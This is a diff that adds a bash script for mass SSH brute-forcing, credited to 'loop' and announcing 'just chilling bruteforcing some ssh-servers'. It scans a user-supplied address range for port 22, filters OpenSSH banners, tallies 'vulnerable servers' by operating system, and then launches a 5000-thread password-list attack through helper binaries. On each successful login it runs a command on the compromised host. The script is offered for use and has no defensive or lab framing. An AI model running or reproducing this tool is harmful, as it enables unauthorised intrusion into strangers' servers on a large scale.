@@ -1,0 +1,88 @@
+#!/bin/bash
+
+port=22
+threads=5000
+timeout=12
+banners_threads=500
+########################################
+#colors
+RESTORE='\033[0m'
+RED='\033[00;31m'
+GREEN='\033[00;32m'
+YELLOW='\033[00;33m'
+BLUE='\033[00;34m'
+MAGENTA='\033[00;35m'
+PURPLE='\033[00;35m'
+CYAN='\033[00;36m'
+LIGHTGRAY='\033[00;37m'
+LRED='\033[01;31m'
+LGREEN='\033[01;32m'
+LYELLOW='\033[01;33m'
+LBLUE='\033[01;34m'
+LMAGENTA='\033[01;35m'
+LPURPLE='\033[01;35m'
+LCYAN='\033[01;36m'
+WHITE='\033[01;37m'
+
+
+if [ $# != 1 ]; then
+        echo -e " usage: $0 <b class>"
+        exit;
+fi
+
+rm -rf banners.log
+rm -rf ips bios.txt ip.tmp scan.log banner.log
+clear
+echo -e "${RED}|${BLUE}~${RED}|${RED}  ▄█        ▄██████▄   ▄██████▄     ▄███████▄ ";
+echo -e "${RED}|${BLUE}~${RED}|${RED} ███       ███    ███ ███    ███   ███    ███ ";
+echo -e "${RED}|${BLUE}~${RED}|${RED} ███       ███    ███ ███    ███   ███    ███ ";
+echo -e "${RED}|${BLUE}~${RED}|${RED} ███       ███    ███ ███    ███   ███    ███ ";
+echo -e "${RED}|${BLUE}~${RED}|${RED} ███       ███    ███ ███    ███ ▀█████████▀  ";
+echo -e "${RED}|${BLUE}~${RED}|${RED} ███       ███    ███ ███    ███   ███        ";
+echo -e "${RED}|${BLUE}~${RED}|${RED} ███▌    ▄ ███    ███ ███    ███   ███        ";
+echo -e "${RED}|${BLUE}~${RED}|${RED} █████▄▄██  ▀██████▀   ▀██████▀   ▄████▀      ";
+echo -e "${RED}|${BLUE}~${RED}|${RED} ▀                                            ";
+sleep 0.1
+echo -e "${RED}|${BLUE}~${RED}|${LRED} just chilling bruteforcing some ssh-servers."
+echo -e "${RED}|${BLUE}~${RED}|${CYAN} loop ${LRED} created this scanner."
+sleep 1
+echo -e "${RED}|${BLUE}~${RED}|${LRED} stage 1 begins - scanning the ip range !"
+
+./././././b $1 22
+
+cat scan.log
+echo -e "${RED}|${BLUE}~${RED}|${LRED} stage 2 begins - filtering the ip's "
+./c scan.log $port $banners_threads > /dev/null
+
+sleep 5
+rm -rf ips
+
+awk '{ sub("\r$", ""); print }' banner.log > banners.log
+rm -rf banner.log
+vulns=$(cat banners.log |wc -l) > /dev/null
+ubuntu=$(cat  banners.log  |grep Ubuntu  |wc -l) > /dev/null
+debian=$(cat banners.log  |grep Debian  |wc -l) > /dev/null
+freebsd=$(cat banners.log  |grep FreeBSD |wc -l) > /dev/null
+altele=$(cat banners.log |grep -v FreeBSD |grep -v Debian |grep -v Ubuntu |wc -l) > /dev/null
+echo -e "${RED}|${BLUE}~${RED}|${LRED}            We found \e[92m[$vulns]\e[0m vulnerable servers"
+echo -e "${RED}|${BLUE}~${RED}|${LRED}            Ubuntu: \e[93m[$ubuntu]\e[0m"
+echo -e "${RED}|${BLUE}~${RED}|${LRED}            Debian: \e[93m[$debian]\e[0m"
+echo -e "${RED}|${BLUE}~${RED}|${LRED}            FreeBSD: \e[93m[$freebsd]\e[0m"
+echo -e "${RED}|${BLUE}~${RED}|${LRED}            Others: \e[93m[$altele]\e[0m"
+cat banners.log | grep OpenSSH|cut -d ":" -f 1 > ips
+
+ipscount=`grep -c . ips`
+
+sleep 1
+
+pass=$(cat pass | wc -l);
+ips=$(cat ips | wc -l);
+echo -e "${RED}|${BLUE}~${RED}|${LRED} stage 3 begins - bruteforcing the ip's "
+echo -e "${RED}|${BLUE}~${RED}|${LRED} Start bruteforcing on [ Class: $1 [ Found: $ips ips ] - [ $pass Passwords ]"
+
+sleep 1
+
+./d $threads -f ips pass $port "uname -s -v -n -r"
+
+sleep 1
+
